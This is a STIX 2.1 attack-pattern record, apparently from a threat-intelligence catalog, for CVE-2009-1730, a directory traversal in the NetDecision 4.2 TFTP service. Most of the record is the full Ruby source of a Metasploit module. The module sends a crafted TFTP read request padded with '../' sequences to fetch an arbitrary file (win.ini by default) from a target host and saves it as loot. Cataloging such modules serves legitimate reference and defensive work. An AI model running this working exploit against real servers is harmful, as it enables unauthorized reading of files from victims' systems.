{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--56df96a0-fa8d-48a8-9cbd-60e8fc5bd602",
    "created": "2024-08-14T16:27:57.881454Z",
    "modified": "2024-08-14T16:27:57.881458Z",
    "name": "\"NetDecision 4.2 TFTP Directory Traversal\"",
    "description": " This modules exploits a directory traversal vulnerability in NetDecision 4.2 TFTP service.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/tftp/netdecision_tftp.rb",
            "external_id": "netdecision_tftp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1730"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"NetDecision 4.2 TFTP Directory Traversal\",\n      'Description'    => %q{\n          This modules exploits a directory traversal vulnerability in NetDecision 4.2\n        TFTP service.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Rob Kraus', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2009-1730'],\n          ['OSVDB', '54607'],\n          ['BID', '35002']\n        ],\n      'DisclosureDate' => '2009-05-16'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(69),\n        OptInt.new('DEPTH', [false, \"Levels to reach base directory\",1]),\n        OptString.new('FILENAME', [false, 'The file to loot', 'windows\\\\win.ini']),\n      ])\n  end\n\n  def run_host(ip)\n\n\n    # Configure how deep we want to traverse\n    depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']\n    # Prepare the filename\n    file_name = \"../\" * depth\n    file_name << datastore['FILENAME']\n\n    # Prepare the packet\n    pkt = \"\\x00\\x01\"\n    pkt << file_name\n    pkt << \"\\x00\"\n    pkt << \"octet\"\n    pkt << \"\\x00\"\n\n    # We need to reuse the same port in order to receive the data\n    udp_sock = Rex::Socket::Udp.create(\n      {\n        'Context' => {'Msf' => framework, 'MsfExploit'=>self}\n      }\n    )\n\n    add_socket(udp_sock)\n\n    # Send the packet to target\n    file_data = ''\n    udp_sock.sendto(pkt, ip, datastore['RPORT'].to_i)\n\n    while (r = udp_sock.recvfrom(65535, 0.1) and r[1])\n\n      opcode, block, data = r[0].unpack(\"nna*\") # Parse reply\n      if opcode != 3 # Check opcode: 3 => Data Packet\n        print_error(\"Error retrieving file #{file_name} from #{ip}\")\n        return\n      end\n      file_data << data\n      udp_sock.sendto(tftp_ack(block), r[1], r[2].to_i, 0) # Ack\n\n    end\n\n    if file_data.empty?\n        print_error(\"Error retrieving file #{file_name} from #{ip}\")\n        return\n    end\n\n    udp_sock.close\n\n    # Output file if verbose\n    vprint_line(file_data.to_s)\n\n    # Save file to disk\n    path = store_loot(\n      'netdecision.tftp',\n      'application/octet-stream',\n      ip,\n      file_data,\n      datastore['FILENAME']\n    )\n\n    print_status(\"File saved in: #{path}\")\n  end\n\n  #\n  # Returns an Acknowledgement\n  #\n  def tftp_ack(block=1)\n\n    pkt = \"\\x00\\x04\" # Ack\n    pkt << [block].pack(\"n\") # Block Id\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-05-16"
}